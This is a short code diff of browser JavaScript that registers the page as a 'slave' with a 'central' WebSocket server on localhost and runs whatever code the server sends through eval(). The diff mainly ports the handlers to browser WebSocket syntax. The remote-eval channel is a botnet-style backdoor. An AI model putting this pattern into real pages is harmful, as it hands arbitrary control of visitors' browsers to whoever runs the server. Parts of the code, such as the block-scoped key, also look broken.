@@ -1,4 +1,3 @@
-let ws = new WebSocket("ws://localhost:3000");
 if(localStorage.getItem("__ussn_key") == null){
     let key = window.crypto.getRandomValues(new Uint32Array(1))[0].toString(16);
     localStorage.__ussn_key = key;
@@ -9,15 +8,16 @@ if(localStorage.getItem("__ussn_key") == null){
     let key = window.crypto.getRandomValues(new Uint32Array(1))[0].toString(16);
     localStorage.__ussn_key = key;
 }
-ws.on("open", () => {
+let ws = new WebSocket("ws://localhost:3001");
+ws.onopen = () => {
     console.log("Connected to central");
     ws.send(JSON.stringify({
         type: "slave",
         key: key
     }));
-});
-ws.on("message", (data) => {
-    data = JSON.parse(data);
+};
+ws.onmessage = (data) => {
+    data = JSON.parse(data.data);
     console.log(data);
     if(data.type == "ping"){
         ws.send(JSON.stringify({
@@ -34,4 +34,4 @@ ws.on("message", (data) => {
             eval(data.data);
         }
     }
-}
+};
